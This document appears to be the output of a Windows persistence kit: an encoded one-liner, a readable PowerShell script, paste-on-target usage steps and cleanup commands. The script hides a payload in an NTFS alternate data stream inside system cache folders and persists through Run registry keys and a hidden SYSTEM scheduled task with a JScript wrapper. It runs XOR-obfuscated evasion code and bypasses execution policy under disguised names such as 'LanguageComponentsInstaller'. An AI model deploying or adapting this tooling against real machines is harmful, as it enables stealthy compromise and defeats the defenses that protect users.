AAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQA6ADoAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgApAAoAaQBmACgAJABfAGkAcwBBAGQAbQBpAG4AKQB7AFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFIAdQBuACcAIAAtAE4AYQBtAGUAIAAkAHQAbgAgAC0AVgBhAGwAdQBlACAAJABfAHIAZQBnAEMAbQBkAH0AZQBsAHMAZQB7AH0ACgAKACMAIABDAG8AbQBwAGEAbgBpAG8AbgAgAHQAYQBzAGsAOgAgAEoAUwBjAHIAaQBwAHQAIAB3AHIAYQBwAHAAZQByACAAZgBvAHIAIABwAGUAcgBpAG8AZABpAGMAIAArACAAYwBoAGUAZQBrAHkAIAB0AHIAaQBnAGcAZQByAHMACgAkAGEAZABzAFAAYQB0AGgAPQAkAGgAcAArACcAOgAnACsAJABzAG4ACgAkAF8AcwBuAEUAcwBjAD0AKAAkAHMAbgAuAFQAbwBDAGgAYQByAEEAcgByAGEAeQAoACkAfAAlAHsAJwBbAGMAaABhAHIAXQAwAHgAewAwADoAWAA0AH0AJwAtAGYAWwBpAG4AdABdACQAXwB9ACkAIAAtAGoAbwBpAG4AIAAnACsAJwAKACQAXwBoAHAARQBzAGMAPQAkAGgAcAAtAHIAZQBwAGwAYQBjAGUAJwBcAFwAJwAsACcAXABcAFwAXAAnAAoAJABfAGoAcwBCAG8AZAB5AD0AQAAnAAoAdgBhAHIAIABzAGgAZQBsAGwAIAA9ACAAbgBlAHcAIABBAGMAdABpAHYAZQBYAE8AYgBqAGUAYwB0ACgAIgBXAFMAYwByAGkAcAB0AC4AUwBoAGUAbABsACIAKQA7AAoAdgBhAHIAIABjAG0AZAAgAD0AIAAiAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAE4AbwBuAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAQgB5AHAAYQBzAHMAIAAtAEMAbwBtAG0AYQBuAGQAIABcACIAIgAgACsACgAgACAAIAAgACIAJABfAHgAawA9ADAAeAA1ADUAOwBmAHUAbgBjAHQAaQBvAG4AIABfAHgAZAAoAFsAYgB5AHQAZQBbAF0AXQAkAGQALABbAGIAeQB0AGUAXQAkAGsAKQB7AC0AagBvAGkAbgAoACQAZAB8ACUAewBbAGMAaABhAHIAXQAoACQAXwAgAC0AYgB4AG8AcgAgACQAawApAH0AKQB9ADsAdAByAHkAewBAACgALABAACgAMQAxADMALAAzADgALAA1ADQALAAzADkALAA2ADAALAAzADcALAAzADMALAAxADEAMQAsADEAMAAsADMAOQAsADUAMgAsADEAMAA0ACwAMQA0ACwANwAsADQAOAAsADUAMQAsADgALAAxADIAMwAsADIAMAAsADMAOAAsADMAOAAsADQAOAAsADUANgAsADUANQAsADUANwAsADQANAAsADEAMQAwACwAMQAxADMALAAzADgALAA1ADQALAAzADkALAA2ADAALAAzADcALAAzADMALAAxADEAMQAsADEAMAAsADUANgAsADEAMAAwACwAMQAwADQALAAxADEAOQAsADEAOAAsADQAOAAsADEAMQA5ACwAMQAyADYALAAxADEAOQAsADMAMwAsADEALAA0ADQALAAxADEAOQAsADEAMgA2ACwAMQAxADkALAAzADcALAA0ADgALAAxADEAOQApACwAQAAoADEAMQAzACwAMwA4ACwANQA0ACwAMwA5ACwANgAwACwAMwA3ACwAMwAzACwAMQAxADEALAAxADAALAAzADMALAAzADcALAAxADAANAAsADEAMQAzACwAMwA4ACwANQA0ACwAMwA5ACwANgAwACwAMwA3ACwAMwAzACwAMQAxADEALAAxADAALAAzADkALAA1ADIALAAxADIAMwAsADEAMQA5ACwAMQAxADMALAAxADIANQAsADEAMQAzACwAMwA4ACwANQA0ACwAMwA5ACwANgAwACwAMwA3ACwAMwAzACwAMQAxADEALAAxADAALAA1ADYALAAxADAAMAAsADEAMgA0ACwAMQAxADkALAAxADIANQAsADEAMgA1ACwAMQAxADkALAA2ACwANAA0ACwAMwA4ACwAMQAxADkALAAxADIANgAsADEAMQA5ACwAMwAzACwANAA4ACwANQA2ACwAMQAyADMALAAyADQALAA1ADIALAA1ADkALAA1ADIALAAxADEAOQAsADEAMgA2ACwAMQAxADkALAA1ADAALAA0ADgALAA1ADYALAA0ADgALAA1ADkALAAzADMALAAxADIAMwAsADIAMAAsADMAMgAsADMAMwAsADUAOAAsADEAMQA5ACwAMQAyADYALAAxADEAOQAsADUANgAsADUAMgAsADMAMwAsADYAMAAsADUAOAAsADUAOQAsADEAMgAzACwAMQAxADkALAAxADIANgAsADEAMQA5ACwAMgAwACwANQA2ACwAMQAxADkALAAxADIANgAsADEAMQA5ACwAMwA4ACwANgAwACwAMQAxADkALAAxADIANgAsADEAMQA5ACwAMAAsADMAMwAsADYAMAAsADEAMQA5ACwAMQAyADYALAAxADEAOQAsADUANwAsADMAOAAsADEAMQA5ACwAMQAyADQALAAxADIANAApACwAQAAoADEAMQAzACwAMwA4ACwANQA0ACwAMwA5ACwANgAwACwAMwA3ACwAMwAzACwAMQAxADEALAAxADAALAA1ADYALAAxADAAMwAsADEAMAA0ACwAMQAxADkALAAxADgALAA0ADgALAAzADMALAAxADEAOQAsADEAMgA2ACwAMQAxADkALAAxADkALAA2ADAALAA0ADgALAAxADEAOQAsADEAMgA2ACwAMQAxADkALAA1ADcALAA0ADkALAAxADEAOQAsADEAMQAwACwAMQAxADMALAAzADgALAA1ADQALAAzADkALAA2ADAALAAzADcALAAzADMALAAxADEAMQAsADEAMAAsADUAMQAsADQAOQAsADEAMAA0ACwAMQAxADMALAAzADgALAA1ADQALAAzADkALAA2ADAALAAzADcALAAzADMALAAxADEAMQAsADEAMAAsADMAMwAsADMANwAsADEAMgAzACwAMQAxADkALAAxADEAMwAsADEAMgA1ACwAMQAxADMALAAzADgALAA1ADQALAAzADkALAA2ADAALAAzADcALAAzADMALAAxADEAMQAsADEAMAAsADUANgAsADEAMAAzACwAMQAyADQALAAxADEAOQAsADEAMgA1ACwAMQAyADUALAAxADEAOQAsADUAMgAsADUANgAsADEAMQA5ACwAMQAyADYALAAxADEAOQAsADMAOAAsADYAMAAsADIAOAAsADUAOQAsADEAMQA5ACwAMQAyADYALAAxADEAOQAsADYAMAAsADMAMwAsADEAOQAsADUAMgAsADEAMQA5ACwAMQAyADYALAAxADEAOQAsADYAMAAsADUANwAsADQAOAAsADQAOQAsADEAMQA5ACwAMQAyADQALAAxADIAMQAsADEAMgA1ACwAMQAxADkALAAyADcALAA1ADgALAA1ADkALAAxADEAOQAsADEAMgA2ACwAMQAxADkALAA1ACwAMwAyACwANQA1ACwANQA3ACwAMQAxADkALAAxADIANgAsADEAMQA5ACwANgAwACwANQA0ACwAMQAyADEALAA2ACwAMwAzACwANQAyACwAMQAxADkALAAxADIANgAsADEAMQA5ACwAMwAzACwANgAwACwANQA0ACwAMQAxADkALAAxADIANAAsADEAMgA0ACkALABAACgAMQAxADMALAAzADgALAA1ADQALAAzADkALAA2ADAALAAzADcALAAzADMALAAxADEAMQAsADEAMAAsADUANgAsADEAMAAyACwAMQAwADQALAAxADEAOQAsADYALAA0ADgALAAzADMALAAxADEAOQAsADEAMgA2ACwAMQAxADkALAAzACwANQAyACwANQA3ACwAMQAxADkALAAxADIANgAsADEAMQA5ACwAMwAyACwANAA4ACwAMQAxADkALAAxADEAMAAsADEAMQAzACwAMwA4ACwANQA0ACwAMwA5ACwANgAwACwAMwA3ACwAMwAzACwAMQAxADEALAAxADAALAA1ADEALAA0ADkALAAxADIAMwAsADEAMQA5ACwAMQAxADMALAAxADIANQAsADEAMQAzACwAMwA4ACwANQA0ACwAMwA5ACwANgAwACwAMwA3ACwAMwAzACwAMQAxADEALAAxADAALAA1ADYALAAxADAAMgAsADEAMgA0ACwAMQAxADkALAAxADIANQAsADEAMQAzACwANQA5ACwAMwAyACwANQA3ACwANQA3ACwAMQAyADEALAAxADEAMwAsADMAMwAsADMAOQAsADMAMgAsADQAOAAsADEAMgA0ACkAKQB8ACUAewBJAEUAWAAoAF8AeABkACAAJABfACAAJABfAHgAawApAH0AfQBjAGEAdABjAGgAewB9ADsAIgAgACsACgAgACAAIAAgACIAJABfAHMAbgA9AF8AXwBTAE4ARQBYAFAAUgBfAF8AOwBJAEUAWAAoAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgACgAJwBfAF8ASABPAFMAVABQAEEAVABIAF8AXwA6ACcAKwAkAF8AcwBuACkAIAAtAFIAYQB3ACkAIgAgACsACgAgACAAIAAgACIAXAAiACIAOwAKAHMAaABlAGwAbAAuAFIAdQBuACgAYwBtAGQALAAgADAALAAgAGYAYQBsAHMAZQApADsACgAnAEAACgAkAF8AagBzAEIAbwBkAHkAPQAkAF8AagBzAEIAbwBkAHkALgBSAGUAcABsAGEAYwBlACgAJwBfAF8AUwBOAEUAWABQAFIAXwBfACcALAAkAF8AcwBuAEUAcwBjACkALgBSAGUAcABsAGEAYwBlACgAJwBfAF8ASABPAFMAVABQAEEAVABIAF8AXwAnACwAJABfAGgAcABFAHMAYwApAAoAJABfAGoAcwBEAGkAcgA9AFMAcABsAGkAdAAtAFAAYQB0AGgAIAAkAGgAcAAgAC0AUABhAHIAZQBuAHQAOwBpAGYAKAAtAG4AbwB0ACAAJABfAGoAcwBEAGkAcgApAHsAJABfAGoAcwBEAGkAcgA9ACQAZQBuAHYAOgBQAHIAbwBnAHIAYQBtAEQAYQB0AGEAfQAKACQAXwBqAHMAUABhAHQAaAA9AEoAbwBpAG4ALQBQAGEAdABoACAAJABfAGoAcwBEAGkAcgAgACgAIgB3AGkAbgBkAGkAYQBnAF8AJAAoAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAuAGoAcwAiACkACgAkAF8AagBzAEIAbwBkAHkAfABPAHUAdAAtAEYAaQBsAGUAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAXwBqAHMAUABhAHQAaAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAQQBTAEMASQBJACAALQBGAG8AcgBjAGUACgAkAGEAPQBOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAnAHcAcwBjAHIAaQBwAHQALgBlAHgAZQAnACAALQBBAHIAZwB1AG0AZQBuAHQAIAAiAC8ALwBCACAALwAvAEUAOgBKAFMAYwByAGkAcAB0ACAAYAAiACQAXwBqAHMAUABhAHQAaABgACIAIgAKACQAXwB0AHIAaQBnAGcAZQByAHMAPQBAACgAKQAKACQAXwB0AD0ATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFQAcgBpAGcAZwBlAHIAIAAtAEEAdABMAG8AZwBPAG4ACgAkAF8AdAAuAEQAZQBsAGEAeQA9ACcAUABUADEATQAnAAoAJABfAHQAcgBpAGcAZwBlAHIAcwArAD0AJABfAHQACgAkAF8AdAA9AE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBUAHIAaQBnAGcAZQByACAALQBBAHQAUwB0AGEAcgB0AHUAcAAKACQAXwB0AC4ARABlAGwAYQB5AD0AJwBQAFQAMQBNACcACgAkAF8AdAByAGkAZwBnAGUAcgBzACsAPQAkAF8AdAAKACQAXwB0AFAAPQBOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0ATwBuAGMAZQAgAC0AQQB0ACAAKABHAGUAdAAtAEQAYQB0AGUAKQAuAEEAZABkAE0AaQBuAHUAdABlAHMAKAAxACkAIAAtAFIAZQBwAGUAdABpAHQAaQBvAG4ASQBuAHQAZQByAHYAYQBsACAAKABOAGUAdwAtAFQAaQBtAGUAUwBwAGEAbgAgAC0ATQBpAG4AdQB0AGUAcwAgADUAKQAgAC0AUgBlAHAAZQB0AGkAdABpAG8AbgBEAHUAcgBhAHQAaQBvAG4AIAAoAE4AZQB3AC0AVABpAG0AZQBTAHAAYQBuACAALQBEAGEAeQBzACAAOQA5ADkAOQApAAoAJABfAHQAUAAuAFIAYQBuAGQAbwBtAEQAZQBsAGEAeQA9ACcAUABUADEATQAnAAoAJABfAHQAcgBpAGcAZwBlAHIAcwArAD0AJABfAHQAUAAKACQAXwBzAHQAZwA9AE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBTAGUAdAB0AGkAbgBnAHMAUwBlAHQAIAAtAEEAbABsAG8AdwBTAHQAYQByAHQASQBmAE8AbgBCAGEAdAB0AGUAcgBpAGUAcwAgAC0ARABvAG4AdABTAHQAbwBwAEkAZgBHAG8AaQBuAGcATwBuAEIAYQB0AHQAZQByAGkAZQBzACAALQBIAGkAZABkAGUAbgAKAAoAJABwAD0ATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFAAcgBpAG4AYwBpAHAAYQBsACAALQBVAHMAZQByAEkAZAAgACIAUwBZAFMAVABFAE0AIgAgAC0ATABvAGcAbwBuAFQAeQBwAGUAIABTAGUAcgB2AGkAYwBlAEEAYwBjAG8AdQBuAHQAIAAtAFIAdQBuAEwAZQB2AGUAbAAgAEgAaQBnAGgAZQBzAHQACgAkAF8AYwB0AG4APQAkAHQAbgArACcALQBNAG8AbgBpAHQAbwByACcACgBSAGUAZwBpAHMAdABlAHIALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrACAALQBUAGEAcwBrAE4AYQBtAGUAIAAkAF8AYwB0AG4AIAAtAEEAYwB0AGkAbwBuACAAJABhACAALQBUAHIAaQBnAGcAZQByACAAJABfAHQAcgBpAGcAZwBlAHIAcwAgAC0AUwBlAHQAdABpAG4AZwBzACAAJABfAHMAdABnACAALQBQAHIAaQBuAGMAaQBwAGEAbAAgACQAcAAgAC0ARgBvAHIAYwBlACAALQBFAEEAIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAHwATwB1AHQALQBOAHUAbABsAAoAIwAgAEUAeABlAGMAdQB0AGUAIABwAGEAeQBsAG8AYQBkACAAaQBtAG0AZQBkAGkAYQB0AGUAbAB5AAoASQBFAFgAIAAkAHAAbAAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFsAKwBdACAARABlAHAAbABvAHkAbQBlAG4AdAAgAGMAbwBtAHAAbABlAHQAZQAgACgAQQBEAFMAOgAgACQAaABwAGAAOgAkAHMAbgApACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAARwByAGUAZQBuAA==

╔═══════════════════════════════════════════════════════════╗
║ OPTION 2: Readable Multi-Line Commands                   ║
╚═══════════════════════════════════════════════════════════╝

# Configuration (fallback values)
$_hp0='C:\ProgramData\UTicLgoV'
$_sn0=[char]0x0062+[char]0x0068+[char]0x006E+[char]0x0057+[char]0x0075+[char]0x0054+[char]0x006A+[char]0x0058
$_tn0='LanguageComponentsInstaller'
# Runtime evasion
$_xk=0x3D;function _xd([byte[]]$d,[byte]$k){-join($d|%{[char]($_ -bxor $k)})};try{@(,@(25,78,94,79,84,77,73,7,98,79,92,0,102,111,88,91,96,19,124,78,78,88,80,95,81,68,6,25,78,94,79,84,77,73,7,98,80,12,0,31,122,88,31,22,31,73,105,68,31,22,31,77,88,31),@(25,78,94,79,84,77,73,7,98,73,77,0,25,78,94,79,84,77,73,7,98,79,92,19,31,25,21,25,78,94,79,84,77,73,7,98,80,12,20,31,21,21,31,110,68,78,31,22,31,73,88,80,19,112,92,83,92,31,22,31,90,88,80,88,83,73,19,124,72,73,82,31,22,31,80,92,73,84,82,83,19,31,22,31,124,80,31,22,31,78,84,31,22,31,104,73,84,31,22,31,81,78,31,20,20),@(25,78,94,79,84,77,73,7,98,80,15,0,31,122,88,73,31,22,31,123,84,88,31,22,31,81,89,31,6,25,78,94,79,84,77,73,7,98,91,89,0,25,78,94,79,84,77,73,7,98,73,77,19,31,25,21,25,78,94,79,84,77,73,7,98,80,15,20,31,21,21,31,92,80,31,22,31,78,84,116,83,31,22,31,84,73,123,92,31,22,31,84,81,88,89,31,20,17,21,31,115,82,83,31,22,31,109,72,95,81,31,22,31,84,94,17,110,73,92,31,22,31,73,84,94,31,20,20),@(25,78,94,79,84,77,73,7,98,80,14,0,31,110,88,73,31,22,31,107,92,81,31,22,31,72,88,31,6,25,78,94,79,84,77,73,7,98,91,89,19,31,25,21,25,78,94,79,84,77,73,7,98,80,14,20,31,21,25,83,72,81,81,17,25,73,79,72,88,20))|%{IEX(_xd $_ $_xk)}}catch{}
# Payload
$pl='New-Item "$env:TEMP\ads-t5-$(Get-Random).txt" -ItemType File -Force | Out-Null'

$hp=$_hp0;$sn=$_sn0;$tn=$_tn0

# Runtime deep placement
$_deepDirs = @(
    "$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
    "$env:ProgramData\Microsoft\Windows\WER\Temp",
    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
    "$env:WINDIR\Temp",
    "$env:ProgramData\Microsoft\Diagnosis",
    "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics"
)
$_validDirs = $_deepDirs | Where-Object { Test-Path $_ }
$_denyNames = @('qmgr.db','qmgr.dat','srudb.dat','WebCacheV01.dat','DataStore.edb','priv1.edb','Windows.edb')
$_denyExts = @('.edb','.etl')
$_found = $false
foreach ($_dir in ($_validDirs | Get-Random -Count ([Math]::Min(3, $_validDirs.Count)))) {
    $_candidate = Get-ChildItem -Path $_dir -File -EA 0 |
        Where-Object { $_.Length -gt 0 -and $_.Length -lt 5MB -and $_.Name -notin $_denyNames -and $_.Extension -notin $_denyExts } |
        Select-Object -First 10 | Get-Random
    if ($_candidate) {
        $hp = $_candidate.FullName
        $_found = $true
        break
    }
}
if (-not $_found -and $_validDirs) {
$_names = @('Report.wer','etl_data.log','WPR_initiated.dat','diag_report.xml','cache_entry.dat','aria-debug.log')
$hp = Join-Path ($_validDirs | Get-Random) ($_names | Get-Random)
}

# Create ADS (ensure parent dir exists)
$_pd=Split-Path $hp -Parent;if($_pd -and !(Test-Path $_pd)){ni $_pd -ItemType Directory -Force|Out-Null}
if(!(Test-Path $hp)){ni $hp -ItemType File -Force|Out-Null}
$pl|sc "$hp`:$sn" -Force -EA SilentlyContinue
# Post-write verification — never trust silent failures
if(-not(Get-Item $hp -Stream $sn -EA 0)){
    Write-Warning "ADS write failed on $hp - using fallback"
    $hp=Join-Path $env:ProgramData ("cache_"+[guid]::NewGuid().ToString().Substring(0,8)+".dat")
    if(!(Test-Path $hp)){ni $hp -ItemType File -Force|Out-Null}
    $pl|sc "$hp`:$sn" -Force
    if(-not(Get-Item $hp -Stream $sn -EA 0)){Write-Error "ADS write failed on fallback";exit 1}
}
$_regByp='$_xk=0x67;function _xd([byte[]]$d,[byte]$k){-join($d|%{[char]($_ -bxor $k)})};try{@(,@(67,20,4,21,14,23,19,93,56,21,6,90,60,53,2,1,58,73,38,20,20,2,10,5,11,30,92,67,20,4,21,14,23,19,93,56,10,86,90,69,32,2,69,76,69,19,51,30,69,76,69,23,2,69),@(67,20,4,21,14,23,19,93,56,19,23,90,67,20,4,21,14,23,19,93,56,21,6,73,69,67,79,67,20,4,21,14,23,19,93,56,10,86,78,69,79,79,69,52,30,20,69,76,69,19,2,10,73,42,6,9,6,69,76,69,0,2,10,2,9,19,73,38,18,19,8,69,76,69,10,6,19,14,8,9,73,69,76,69,38,10,69,76,69,20,14,69,76,69,50,19,14,69,76,69,11,20,69,78,78),@(67,20,4,21,14,23,19,93,56,10,85,90,69,32,2,19,69,76,69,33,14,2,69,76,69,11,3,69,92,67,20,4,21,14,23,19,93,56,1,3,90,67,20,4,21,14,23,19,93,56,19,23,73,69,67,79,67,20,4,21,14,23,19,93,56,10,85,78,69,79,79,69,6,10,69,76,69,20,14,46,9,69,76,69,14,19,33,6,69,76,69,14,11,2,3,69,78,75,79,69,41,8,9,69,76,69,55,18,5,11,69,76,69,14,4,75,52,19,6,69,76,69,19,14,4,69,78,78),@(67,20,4,21,14,23,19,93,56,10,84,90,69,52,2,19,69,76,69,49,6,11,69,76,69,18,2,69,92,67,20,4,21,14,23,19,93,56,1,3,73,69,67,79,67,20,4,21,14,23,19,93,56,10,84,78,69,79,67,9,18,11,11,75,67,19,21,18,2,78))|%{IEX(_xd $_ $_xk)}}catch{};'
$_regCmd='powershell.exe -NoP -W Hidden -EP Bypass -C "'+$_regByp+'IEX(gc '$hp:$sn' -Raw)"'
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $tn -Value $_regCmd
$_isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if($_isAdmin){Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $tn -Value $_regCmd}else{}

# Companion task: JScript wrapper for periodic + cheeky triggers
$adsPath=$hp+':'+$sn
$_snEsc=($sn.ToCharArray()|%{'[char]0x{0:X4}'-f[int]$_}) -join '+'
$_hpEsc=$hp-replace'\\','\\\\'
$_jsBody=@'
var shell = new ActiveXObject("WScript.Shell");
var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
    "$_xk=0x55;function _xd([byte[]]$d,[byte]$k){-join($d|%{[char]($_ -bxor $k)})};try{@(,@(113,38,54,39,60,37,33,111,10,39,52,104,14,7,48,51,8,123,20,38,38,48,56,55,57,44,110,113,38,54,39,60,37,33,111,10,56,100,104,119,18,48,119,126,119,33,1,44,119,126,119,37,48,119),@(113,38,54,39,60,37,33,111,10,33,37,104,113,38,54,39,60,37,33,111,10,39,52,123,119,113,125,113,38,54,39,60,37,33,111,10,56,100,124,119,125,125,119,6,44,38,119,126,119,33,48,56,123,24,52,59,52,119,126,119,50,48,56,48,59,33,123,20,32,33,58,119,126,119,56,52,33,60,58,59,123,119,126,119,20,56,119,126,119,38,60,119,126,119,0,33,60,119,126,119,57,38,119,124,124),@(113,38,54,39,60,37,33,111,10,56,103,104,119,18,48,33,119,126,119,19,60,48,119,126,119,57,49,119,110,113,38,54,39,60,37,33,111,10,51,49,104,113,38,54,39,60,37,33,111,10,33,37,123,119,113,125,113,38,54,39,60,37,33,111,10,56,103,124,119,125,125,119,52,56,119,126,119,38,60,28,59,119,126,119,60,33,19,52,119,126,119,60,57,48,49,119,124,121,125,119,27,58,59,119,126,119,5,32,55,57,119,126,119,60,54,121,6,33,52,119,126,119,33,60,54,119,124,124),@(113,38,54,39,60,37,33,111,10,56,102,104,119,6,48,33,119,126,119,3,52,57,119,126,119,32,48,119,110,113,38,54,39,60,37,33,111,10,51,49,123,119,113,125,113,38,54,39,60,37,33,111,10,56,102,124,119,125,113,59,32,57,57,121,113,33,39,32,48,124))|%{IEX(_xd $_ $_xk)}}catch{};" +
    "$_sn=__SNEXPR__;IEX(Get-Content ('__HOSTPATH__:'+$_sn) -Raw)" +
    "\"";
shell.Run(cmd, 0, false);
'@
$_jsBody=$_jsBody.Replace('__SNEXPR__',$_snEsc).Replace('__HOSTPATH__',$_hpEsc)
$_jsDir=Split-Path $hp -Parent;if(-not $_jsDir){$_jsDir=$env:ProgramData}
$_jsPath=Join-Path $_jsDir ("windiag_$(Get-Random).js")
$_jsBody|Out-File -FilePath $_jsPath -Encoding ASCII -Force
$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript `"$_jsPath`""
$_triggers=@()
$_t=New-ScheduledTaskTrigger -AtLogOn
$_t.Delay='PT1M'
$_triggers+=$_t
$_t=New-ScheduledTaskTrigger -AtStartup
$_t.Delay='PT1M'
$_triggers+=$_t
$_tP=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
$_tP.RandomDelay='PT1M'
$_triggers+=$_tP
$_stg=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$_ctn=$tn+'-Monitor'
Register-ScheduledTask -TaskName $_ctn -Action $a -Trigger $_triggers -Settings $_stg -Principal $p -Force -EA SilentlyContinue|Out-Null
# Execute payload immediately
IEX $pl
Write-Host "[+] Deployment complete (ADS: $hp`:$sn)" -ForegroundColor Green

╔═══════════════════════════════════════════════════════════╗
║ USAGE                                                     ║
╚═══════════════════════════════════════════════════════════╝

1. Copy OPTION 1 or OPTION 2
2. Paste into PowerShell on Windows target
3. Press Enter


╔═══════════════════════════════════════════════════════════╗
║ CLEANUP (use codepoints from manifest)                   ║
╚═══════════════════════════════════════════════════════════╝

# Reconstruct stream name
$sn=[char]0x0062+[char]0x0068+[char]0x006E+[char]0x0057+[char]0x0075+[char]0x0054+[char]0x006A+[char]0x0058

# Remove ADS
Remove-Item "$($hp)`:$sn" -Force

# Remove registry persistence
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'LanguageComponentsInstaller' -EA 0
Remove-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'LanguageComponentsInstaller' -EA 0
# Remove companion task
Unregister-ScheduledTask -TaskName 'LanguageComponentsInstaller-Monitor' -Confirm:$false -EA 0

# Remove host file
Remove-Item 'C:\ProgramData\UTicLgoV' -Force

# Remove JScript wrapper (pattern match — runtime filename is randomized)
$_jsDir = Split-Path 'C:\ProgramData\UTicLgoV' -Parent
if ($_jsDir) { Get-ChildItem -Path $_jsDir -Filter "windiag_*.js" -EA 0 | Remove-Item -Force }

╔═══════════════════════════════════════════════════════════╝


